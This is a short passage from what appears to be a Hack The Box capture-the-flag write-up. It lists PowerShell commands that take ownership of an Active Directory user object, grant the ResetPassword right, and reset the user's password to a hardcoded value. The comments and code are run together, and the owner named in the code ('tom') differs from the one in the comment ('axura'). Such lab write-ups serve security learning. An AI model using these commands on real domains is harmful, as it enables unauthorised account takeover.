
# For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source.  
# Licens: CC BY-NC-SA 4.0  
# Author: Axura  
# URL: https://4xura.com/ctf/htb/htb-writeup-escapetwo/  
# Source: Axura's Blog  
  
Set-DomainObjectOwner -Identity victim -OwnerIdentity tom # Assign 'axura' permissions to reset passwords on 'victim' object Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity axura -Rights ResetPassword # Create a PowerShell secure string for the new password and reset password of 'victim' $newPassword = ConvertTo-SecureString "Axura@4sure1377" -AsPlainText -Force Set-DomainUserPassword -Identity victim -AccountPassword $newPassword